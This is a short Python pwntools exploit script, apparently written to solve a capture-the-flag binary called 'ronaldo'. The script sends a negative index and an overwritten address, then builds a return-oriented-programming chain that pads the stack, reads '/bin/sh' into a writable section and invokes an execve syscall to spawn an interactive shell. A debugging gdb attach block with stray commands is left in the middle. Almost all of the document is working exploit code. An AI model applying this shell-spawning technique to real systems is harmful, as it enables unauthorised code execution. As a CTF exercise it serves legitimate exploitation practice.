from pwn import *

context.binary = elf = ELF('./ronaldo', checksec=False)

pr = process('./ronaldo')

write_section = 0x404530

pr.sendline(b'-4')
pr.send(p64(elf.symbols['discipline'] + 4))
rop = ROP(elf)

rop.raw(b'A' * 72)

rop.rdi = 0
rop.rsi = write_section
rop.rdx = 8
rop.call(elf.plt['read'])


gdb.attach(pr, gdbscript='''
            gdb ./ronaldo
            break *main+72   
            run
''')

rop.rdi = write_section
rop.rsi = 0
rop.rdx = 0
rop.rax = 0x3b
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

pr.send(rop.chain())

pause()

pr.send(b'/bin/sh\x00')

pr.interactive()





